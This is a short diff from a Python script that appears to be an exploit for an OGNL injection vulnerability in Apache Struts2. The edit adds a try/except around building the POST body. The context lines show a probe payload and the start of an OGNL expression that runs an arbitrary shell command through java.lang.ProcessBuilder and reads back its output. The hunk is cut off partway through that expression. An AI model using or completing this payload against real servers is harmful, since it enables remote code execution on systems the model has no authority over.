@@ -56,7 +56,10 @@ if __name__ == "__main__":
     url = "http://" + argparse.ip + ":" + argparse.port
     args = find_target_get_parameters(url=url, header=header, proxies=proxies)
     payload = urllib.parse.quote("%{1+1}")
-    post_text = args[0] + "=" + payload + "&" + args[1] + "=" + payload
+    try:
+        post_text = args[0] + "=" + payload + "&" + args[1] + "=" + payload
+    except:
+        print("args is not found")
     command = ("%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\""+shell_command+"\"})).redirectErrorStream(true).start("
                "),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),"
                "#e=new char[50000],#d.read(#e),#f=#context.get("
